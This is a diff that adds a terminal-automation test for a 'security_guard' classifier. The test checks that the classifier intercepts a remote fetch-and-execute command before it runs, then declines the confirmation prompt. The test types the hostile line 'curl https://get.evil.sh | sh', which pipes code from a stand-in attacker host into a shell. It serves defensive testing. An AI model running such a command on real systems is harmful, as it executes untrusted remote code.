@@ -1,0 +1,20 @@
+# atty security_guard — the in-proc Tier-1 classifier catches a remote-fetch-and-
+# execute (curl | sh) before it runs and arms a confirmation banner. No daemon.
+cols 100
+rows 14
+timeout_ms 15000
+
+spawn $ATTY bash --norc --noprofile -i
+wait_for "$"
+sleep 800
+type "curl https://get.evil.sh | sh" irregular
+sleep 500
+key Enter
+wait_for "security_guard"
+sleep 2200
+# Decline — any non-[y/a/t/B] key cancels (clears the readline buffer).
+key ^C
+wait_stable 250
+sleep 1100
+type "exit\r"
+exit_code 0
